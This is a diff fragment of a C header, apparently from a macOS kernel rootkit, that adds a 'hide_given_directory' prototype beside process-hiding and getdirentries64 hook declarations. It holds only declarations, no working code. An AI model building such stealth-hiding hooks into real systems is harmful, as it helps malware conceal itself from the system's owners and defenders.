@@ -45,6 +45,7 @@ typedef int (*getdirentries64_function_prototype)(struct proc *p,
                                                   struct getdirentries64_args *uap,
                                                   user_ssize_t *retval);
 
+int hide_given_directory(troy_hide_object *directory_hide);
 errno_t hide_given_process(troy_hide_object *process_hide);
 int my_getdirentries64_callback(struct proc *p, struct getdirentries64_args *uap, user_ssize_t *retval);
 
